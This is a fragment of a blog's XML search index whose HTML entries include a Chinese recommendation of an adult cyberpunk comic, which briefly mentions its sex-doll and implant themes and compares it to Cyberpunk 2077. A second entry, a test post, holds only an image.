src="/../../images/%E6%9C%AC%E5%AD%90%E6%8E%A8%E8%8D%90%E8%AF%B4-better-than-xxx/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231130170834.jpg" alt="微信图片_20231130170834"></p><p><img src="/../../images/%E6%9C%AC%E5%AD%90%E6%8E%A8%E8%8D%90%E8%AF%B4-better-than-xxx/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231130170838.jpg" alt="微信图片_20231130170838"></p><p>​赛博朋克的故事背景和大名鼎鼎的赛博朋克2077十分相似。故事的中心讨论老生长谈的问题，“机器人是否拥有人权”还有机器人渴望成为人。在这里我们不讨论这个问题。将注意力转移到有趣的设定上去。故事中也有和一般赛博朋克故事一样的义体设定，不过在本作中如“反对性偶”的组织通常有着改造的性器官，有些猎奇又刺激。还有性偶被专门改造的试用于口∠的口腔和舌头。另一点是脑接口的设定，还有赛博吗啡。玩过2077的应该都出现既视感了。<img src="/../../images/%E6%9C%AC%E5%AD%90%E6%8E%A8%E8%8D%90%E8%AF%B4-better-than-xxx/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231130170842.jpg" alt="微信图片_20231130170842"></p><p><img src="/../../images/%E6%9C%AC%E5%AD%90%E6%8E%A8%E8%8D%90%E8%AF%B4-better-than-xxx/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231130170846.jpg" alt="微信图片_20231130170846"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>real-test2</title>
    <link href="/2023/11/30/real-test2/"/>
    <url>/2023/11/30/real-test2/</url>
    
    <content type="html"><![CDATA[<h1 id="I-Have-a-story-to-tell·····"><a href="#I-Have-a-story-to-tell·····" class="headerlink" title="I Have a story to tell·····"></a>I Have a story to tell·····</h1><p><img src="/../../images/real-test2/0ea4ee0b7510c642386e94450ffa3da0.jpg" alt="0ea4ee0b7510c642386e94450ffa3da0"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
